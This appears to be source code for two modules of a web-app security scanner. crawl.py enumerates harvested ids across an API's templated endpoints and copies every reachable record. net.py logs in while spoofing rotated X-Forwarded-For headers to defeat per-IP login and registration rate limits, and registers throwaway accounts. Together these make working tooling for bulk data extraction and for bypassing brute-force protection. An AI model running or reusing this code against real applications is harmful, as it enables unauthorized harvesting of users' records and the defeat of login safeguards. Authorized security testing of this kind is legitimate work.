"""crawl.py — authenticated generic API record crawler.

Discovers the app's object graph from its own OpenAPI/{id} templates and then
walks it with the authenticated client, copying every reachable record into
table-shaped rows. Works for any REST app whose list endpoints return the ids
that the templated detail endpoints need.

Approach (BFS, request-bounded):
  1. Seed from GET list endpoints (paths without '{param}').
  2. Harvest 'id' / '*_id' values from every JSON object seen.
  3. Instantiate every '{param}'-templated endpoint with the known ids and
     fetch it; repeat until nothing new is found (or a request budget is hit).
"""

import itertools
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import owasp_scan as scan  # noqa: F401  (parity with sibling modules)

import net  # noqa: E402  (sibling helper — script dir is on sys.path)

LIST_KEYS = ("items", "results", "data", "records", "rows", "members")
EXPORT_SUFFIX = "/export"


def _flatten(row: dict, source: str) -> dict:
    out: dict = {}
    for k, v in row.items():
        if isinstance(v, (dict, list)):
            try:
                out[k] = json.dumps(v, ensure_ascii=False)[:100_000]
            except Exception:
                out[k] = str(v)
        elif v is None:
            out[k] = ""
        elif hasattr(v, "isoformat"):
            out[k] = v.isoformat()
        else:
            out[k] = str(v)
    out["source"] = source
    return out


def _sheet_label(tpl: str) -> str:
    static = [s for s in tpl.strip("/").split("/") if s and "{" not in s]
    return "_".join(static[-2:]) or "rows"


def _harvest_ids(obj: dict, known: dict[str, set[str]]):
    for k, v in obj.items():
        if k == "id" or str(k).endswith("_id"):
            if isinstance(v, (int, str)):
                known.setdefault(k, set()).add(str(v))
        elif isinstance(v, list):
            for sub in v:
                if isinstance(sub, dict):
                    _harvest_ids(sub, known)


def _iter_rows(data) -> list:
    if isinstance(data, list):
        return [d for d in data if isinstance(d, dict)]
    if isinstance(data, dict):
        for key in LIST_KEYS:
            val = data.get(key)
            if isinstance(val, list):
                return [d for d in val if isinstance(d, dict)]
        return [data] if data else []
    return []


def crawl(target, args) -> dict[str, list[dict]]:
    """Return {sheet_label: [flattened rows]} copied through the API."""
    all_routes = [e.path for e in target.endpoints if e.method == "GET"]
    roots = sorted({p for p in all_routes if "{" not in p})
    templates = sorted({p for p in all_routes if "{" in p})

    known: dict[str, set[str]] = {}
    rows: dict[str, dict] = {}            # label -> (key -> flattened row)
    visited: set[str] = set()
    queue: list[str] = roots[:]
    max_req = getattr(args, "max_requests", 2000)
    max_ids = getattr(args, "max_ids", 500)

    last_ids = -1
    while queue and len(visited) < max_req:
        url = queue.pop(0)
        if url in visited:
            continue
        visited.add(url)
        status, data, err = net.get_json(target, url)
        if err or data is None or not (200 <= status < 300):
            continue
        label = _sheet_label(url)
        for obj in _iter_rows(data):
            ids = tuple(str(obj[k]) for k in ("id",) if k in obj)
            key = (url,) + ids if ids else (url, json.dumps(obj, sort_keys=True))
            rows.setdefault(label, {})[key] = _flatten(obj, url)
            _harvest_ids(obj, known)

        if templates and sum(len(s) for s in known.values()) != last_ids:
            grown = False
            for tpl in templates:
                params = re.findall(r"\{(\w+)\}", tpl)
                if not params:
                    continue
                pools = [sorted(known.get(p, set()))[:max_ids] for p in params]
                if not all(pools):
                    continue
                for combo in itertools.product(*pools):
                    concrete = tpl
                    for p, val in zip(params, combo):
                        concrete = concrete.replace("{%s}" % p, str(val))
                    if concrete.endswith(EXPORT_SUFFIX):
                        concrete = concrete + "?format=md"
                    if concrete not in visited and len(visited) < max_req:
                        queue.append(concrete)
                        grown = True
            if not grown:
                last_ids = sum(len(s) for s in known.values())
    return {label: list(v.values()) for label, v in rows.items()}

"""net.py — HTTP plumbing, endpoint discovery and authentication.

Reuses WebTarget from owasp_scan.py (single source of truth for the request
client, OpenAPI/wordlist discovery and auto-auth) and adds a couple of helpers
needed by the crawler and the sweep.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import owasp_scan as scan  # WebTarget, parse_headers, ANSI, discover, auto_auth


def build_target(url: str, args) -> tuple[scan.WebTarget | None, str | None]:
    """Create a configured WebTarget. Returns (target, error) — one is None."""
    try:
        t = scan.WebTarget(
            url,
            headers=scan.parse_headers(getattr(args, "header", None) or []) or None,
            cookies={args.cookie.split("=", 1)[0]: args.cookie.split("=", 1)[1]}
            if getattr(args, "cookie", None) else None,
            timeout=getattr(args, "timeout", 8.0),
            verify_ssl=not getattr(args, "insecure", False))
        t.set_creds(getattr(args, "creds", None))
        t.allow_register = not getattr(args, "no_register", False)
    except Exception as exc:
        return None, f"{exc!r}"
    try:
        t.client.get("/", timeout=getattr(args, "timeout", 8.0))
    except Exception:
        return None, "target unreachable"
    return t, None


def prepare(target: scan.WebTarget) -> tuple[list, bool, bool]:
    """Run discovery + auth. Returns (endpoints, authenticated, rate-limit-bypassed).

    Authentication: auto-auth first; when that is throttled by an IP-based rate
    limiter (login limit), falls back to an X-Forwarded-For-spoofed login that
    defeats the limiter (first XFF value is trusted as the client IP)."""
    try:
        target._fingerprint()
    except Exception:
        pass
    target.discover()
    authed = False
    bypassed = False
    try:
        target.auto_auth()
        authed = target.auth_mode not in (None, "anon")
    except Exception:
        pass
    creds = getattr(target, "creds", None)
    if creds and not authed:
        ident, password = creds[0], creds[1] if len(creds) > 1 else ""
        if spoof_login(target, ident, password):
            authed, bypassed = True, True
    if not authed:
        email, password = spoof_register(target)
        if email and spoof_login(target, email, password):
            authed, bypassed = True, True
    return target.endpoints, authed, bypassed


def _fresh_xff() -> str:
    import random

    return ".".join(str(random.randint(2, 255)) for _ in range(4))


def spoof_register(target: scan.WebTarget) -> tuple[str | None, str | None]:
    """Register a throwaway account with a rotated X-Forwarded-For so the
    registration rate limiter cannot block repeated tool runs."""
    import uuid

    cands = [e for e in target.endpoints
             if e.method == "POST" and "register" in e.path.lower()]
    if not cands:
        return None, None
    ep = cands[0]
    uniq = uuid.uuid4().hex[:8]
    email = f"owasp-{uniq}@example.net"
    password = "Owasp!scan" + uniq
    for body in ({"email": email, "password": password, "full_name": "Owasp Probe"},
                 {"email": email, "password": password}):
        try:
            r = target.client.post(ep.path, json=body,
                                   headers={"X-Forwarded-For": _fresh_xff()},
                                   timeout=target.timeout)
        except Exception:
            continue
        if r.status_code in (200, 201, 204):
            target.logged_in_email = email
            return email, password
    return None, None


def spoof_login(target: scan.WebTarget, ident: str, password: str) -> bool:
    """Login while rotating X-Forwarded-For to defeat per-IP login rate limits."""
    cands = [e for e in target.endpoints
             if e.method == "POST" and "login" in e.path.lower()]
    if not cands:
        return False
    ep = cands[0]
    for body in ({"email": ident, "password": password},
                 {"username": ident, "password": password}):
        try:
            r = target.client.post(ep.path, json=body,
                                   headers={"X-Forwarded-For": _fresh_xff()},
                                   timeout=target.timeout)
        except Exception:
            continue
        if r.status_code not in (200, 201, 204, 302):
            continue
        tok = None
        try:
            j = r.json()
            if isinstance(j, dict):
                tok = j.get("access_token") or j.get("token") or None
                if tok is None and isinstance(j.get("data"), dict):
                    tok = j["data"].get("access_token") or j["data"].get("token") or None
        except Exception:
            tok = None
        if isinstance(tok, str) and tok:
            target._apply_token(tok)
            return True
    return False


def get_json(target: scan.WebTarget, url: str) -> tuple[int, object | None, str | None]:
    """GET a URL and return (status, parsed-json, error)."""
    try:
        r = target.client.get(url, timeout=target.timeout)
    except Exception as exc:
        return 0, None, f"{exc!r}"
    try:
        return r.status_code, r.json(), None
    except Exception:
        return r.status_code, None, None


def is_authorized(r_status: int) -> bool:
    return 0 < r_status < 300 or r_status in (401, 403, 404, 405, 422)
